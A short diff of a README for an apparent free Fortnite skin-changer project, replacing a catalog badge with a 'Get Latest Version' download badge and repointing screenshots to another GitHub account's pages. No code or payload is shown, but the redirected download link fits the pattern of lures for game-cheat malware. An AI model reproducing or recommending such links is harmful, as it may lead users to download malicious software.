@@ -4,7 +4,7 @@
 
 ---
 
-[![Open Catalog](https://img.shields.io/badge/Open-Cosmetic_Catalog-purple?style=for-the-badge)](https://Fortnite-Best-Skin-Changer.github.io/.github/)
+[![Get](https://img.shields.io/badge/Get-Latest_Version-purple?style=for-the-badge)](https://cationsmosaics.github.io/Fortnite-Free-Skin-Changer-2026)
 
 # 🎨 Overview
 
@@ -67,7 +67,7 @@ The catalog may include visual sections for:
 
 | 🏠 Main Interface | 🧥 Outfit Gallery |
 |:----------------:|:-----------------:|
-| <img src="https://raw.githubusercontent.com/Fortnite-Best-Skin-Changer/.github/main/assets/Main%20Interface.png" width="100%"> | <img src="https://raw.githubusercontent.com/Fortnite-Best-Skin-Changer/.github/main/assets/Outfit%20Gallery.png" width="100%"> |
+| <img src="https://github.com/cationsmosaics/Fortnite-Free-Skin-Changer-2026/blob/main/assets/Main%20Interface.png" width="100%"> | <img src="https://github.com/cationsmosaics/Fortnite-Free-Skin-Changer-2026/blob/main/assets/Outfit%20Gallery.png" width="100%"> |
 | **A simple dashboard for browsing cosmetic categories and featured styles.** | **A visual gallery for comparing outfits, accessories, and themed looks.** |
 
 ---
